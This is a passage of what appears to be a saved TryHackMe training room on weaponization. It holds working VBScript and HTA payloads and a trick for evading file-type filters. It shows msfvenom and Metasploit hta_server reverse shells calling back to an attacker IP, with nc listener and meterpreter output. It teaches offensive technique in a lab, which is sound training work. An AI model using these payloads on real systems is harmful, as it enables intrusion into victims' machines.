<p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/f40a7711a408932981d827bfe6e522f3.png"><br></p><p>Now let's use the VBScript to run executable files. The following <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">vbs</span> code is to invoke the Windows calculator, proof that we can execute <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">.exe</span> files using the Windows native engine (WSH).</p><p>
</p><pre style="font-size:16px"><pre style="font-size:12.25px" class=" language-javascript" tabindex="0"><code class=" language-javascript">Set shell <span class="token operator">=</span> WScript<span class="token punctuation">.</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>
shell<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"C:\Windows\System32\calc.exe "</span> <span class="token operator">&amp;</span> WScript<span class="token punctuation">.</span>ScriptFullName<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>True</code></pre></pre><p>We create an object of the <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">WScript</span> library using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">CreateObject</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">to call the execution payload. Then, we utilize the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Run</span><span style="font-size:1rem">&nbsp;method to execute the payload. For this task, we will</span><span style="font-size:1rem">&nbsp;run the&nbsp;</span>Windows calculator<span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">calc.exe</span><span style="font-size:1rem">.&nbsp;</span></p><p>To execute the <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">exe</span> file, we can run it using the <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">wscript</span> as follows,&nbsp;</p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">c:\Windows\System32&gt;wscript c:\Users\thm\Desktop\payload.vbs</span></code>&nbsp;</pre></div></div>

<p><span style="font-size:1rem">We can also run it via </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">cscript</span><span style="font-size:1rem"> as follows,</span></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">c:\Windows\System32&gt;cscript.exe c:\Users\thm\Desktop\payload.vbs</span></code>
</pre></div></div><p>As a result, the Windows calculator will appear on the Desktop.</p>
<p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/8c7cbe29ee437b83a244994621cf6996.png" style="width:440px;height:435.769px"><br></p>

<p>Another trick. If the VBS files are blacklisted, then we can rename the file to <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">.txt</span> file and run it using <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">wscript</span> as follows,<br></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">c:\Windows\System32&gt;wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</span></code>&nbsp;</pre></div></div>
<p>The result will be as exact as executing the <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">vbs</span> files, which run the <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">calc.exe</span> binary.<br></p>
<p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/f6d6a5f824fa64750e8b15ce6ba07a7a.png" style="width:641.987px;height:367.984px"></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Try to replace the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">calc.exe</span>&nbsp;binary to execute&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">cmd.exe</span>&nbsp;within the Windows machine.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> An HTML Application - HTA
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px"><span>An HTML Application (<a class="QE8fHtd5 glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;QE8fHtd5&#39;)">HTA</a>)</span></span></p><p><span><a class="sRYaUgTd glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;sRYaUgTd&#39;)">HTA</a> stands for â€œHTML Application.â€ It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. </span><span style="font-size:1rem">HTML Applications, also known as HTAs, which are dynamic&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">HTML</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">mshta</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>is used to execute <a class="bOKXibTF glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;bOKXibTF&#39;)">HTA</a> files. It can be executed by itself or automatically from Internet Explorer.&nbsp;</span></span></p><p>

</p><p>In the following example, we will use an&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em"><a href="https://en.wikipedia.org/wiki/ActiveX" target="_blank">ActiveXObject</a></span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">in our payload as proof of concept to execute&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">cmd.exe</span><span style="font-size:1rem">. Consider the following HTML code.</span></p><p></p>


<pre style="font-size:16px" class=" language-javascript" tabindex="0"><code class=" language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
	<span class="token keyword">var</span> c<span class="token operator">=</span> <span class="token string">'cmd.exe'</span>
	<span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'WScript.Shell'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
</code>
</pre>

<p style="line-height:1"></p><p style="line-height:1">Then serve the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">payload.hta</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">from a web server, this could be done from the attacking machine as follows,</span></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server <span class="token number">8090</span></span></span>
<span class="token output"><span>Serving <a class="WzdQXQbL glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;WzdQXQbL&#39;)">HTTP</a> on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)</span></span></code>
</pre></div></div>
<p>On the victim machine, visit the malicious link using Microsoft Edge,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://10.8.232.37:8090/payload.hta</span><span style="font-size:1rem">. Note that the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">10.8.232.37</span><span style="font-size:1rem">&nbsp;is the AttackBox's IP address.</span></p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/f3a719e8137e6fdca683eefbf373ea4f.png" style="width:378.5px;height:481.727px"></p><p style="text-align:center"><img></p>
<p>Once we press&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Run</span><span style="font-size:1rem">,</span><span style="font-size:1rem">&nbsp;the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">payload.hta</span><span style="font-size:1rem">&nbsp;gets executed</span><span style="font-size:1rem">, and then it will invoke the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">cmd.exe</span><span style="font-size:1rem">. The following figure shows that we have successfully executed the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">cmd.exe</span><span style="font-size:1rem">.</span></p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/07c5180cd36650478806a1bf3d4595f2.png"><img style="font-size:1rem"></p>

<p><span style="font-size:1rem"></span></p>
<p style="line-height:1"><b><span><a class="96xE90YL glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;96xE90YL&#39;)">HTA</a> Reverse Connection</span></b></p><p>We can create a reverse shell payload as follows,</p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.8</span>.232.37 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> -f hta-psh -o thm.hta</span></span>
<span class="token output">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta</span></code>
</pre></div></div>
<p>We use the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">msfvenom</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">from the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Metasploit</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">windows/x64/shell_reverse_tcp</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">to our IP and listening port.</span></p><p>On the attacking machine, we need to listen to the port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">443</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">nc</span><span style="font-size:1rem">. Please note this port needs root privileges to open, or you can use different ones.</span></p><p><span style="font-size:1rem"></span></p><p>

</p><p>Once the victim visits the malicious URL and hits run, we get the connection back.</p>
<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo</span> <span class="token function">nc</span> -lvp <span class="token number">443</span></span></span>
<span class="token output"><span>listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads&gt;
pState\Downloads&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1</span></span></code>
</pre></div></div>
<p><span style="font-size:24px"><span>Malicious <a class="kCRE9gh6 glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;kCRE9gh6&#39;)">HTA</a> via Metasploit&nbsp;</span></span></p><p><span>There is another way to generate and serve malicious <a class="6PHQsicY glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;6PHQsicY&#39;)">HTA</a> files using the Metasploit framework. First, run the Metasploit framework using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">msfconsole -q</span><span style="font-size:1rem">&nbsp;command.&nbsp;</span><span style="font-size:1rem">Under the exploit section, there is&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">exploit/windows/misc/hta_server,</span><span style="font-size:1rem">&nbsp;which requires selecting and setting information such as&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">LHOST</span><span style="font-size:1rem">,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">LPORT</span><span style="font-size:1rem">,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">SRVHOST</span><span style="font-size:1rem">,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Payload,</span><span style="font-size:1rem">&nbsp;and finally, executing&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">exploit</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">to run the module.</span></p>


<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output"><span>msf6 &gt; use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) &gt; set LHOST 10.8.232.37
LHOST =&gt; 10.8.232.37
msf6 exploit(windows/misc/hta_server) &gt; set LPORT 443
LPORT =&gt; 443
msf6 exploit(windows/misc/hta_server) &gt; set SRVHOST 10.8.232.37
SRVHOST =&gt; 10.8.232.37
msf6 exploit(windows/misc/hta_server) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) &gt; exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) &gt;
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
</span></span></code>
</pre></div></div>


<p><span style="font-size:1rem"><span>On the victim machine, once we visit the malicious <a class="ybOhjhgU glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;ybOhjhgU&#39;)">HTA</a> file that was provided as a URL by Metasploit, we should receive a reverse connection.</span></span><br></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.201.254    hta_server - Delivering Payload</span></span>
<span class="token output">[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -&gt; 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter &gt; shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app&gt;</span></code>
</pre></div></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Visual Basic for Application - VBA
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px">Visual Basic for Application (VBA)</span></p>
<p style="text-align:left">VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.&nbsp;<br></p><p><span style="font-size:1rem">Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes.&nbsp;</span><span style="font-size:1rem">One of VBA's features is accessing the Windows Application Programming Interface (</span><a href="https://en.wikipedia.org/wiki/Windows_API" target="_blank">API</a><span style="font-size:1rem">)</span><span style="font-size:1rem">&nbsp;and other low-level functionality</span><span style="font-size:1rem">. For more information about VBA, visit </span><a href="https://en.wikipedia.org/wiki/Visual_Basic_for_Applications" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-1196471874">here</span></a><span style="font-size:1rem">.&nbsp;</span></p><p><span style="font-size:1rem">In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.</span></p><p><span style="font-size:1rem">Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.</span></p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/2ceed0307819cf06500e6524a5f632d7.png" style="width:546px;height:415.361px"><br></p><p> </p><p>Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/feb2f077507c6c242658e76ee88fb544.png" style="width:539px;height:326.092px"></p><p>Now create a new blank Microsoft document to create our first&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">macro</span><span style="font-size:1rem">. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">view</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">â†’&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">macros</span><span style="font-size:1rem">. The Macros window shows to create our own macro within the document.</span></p><p style="text-align:center"><img src="./TryHackMe _ 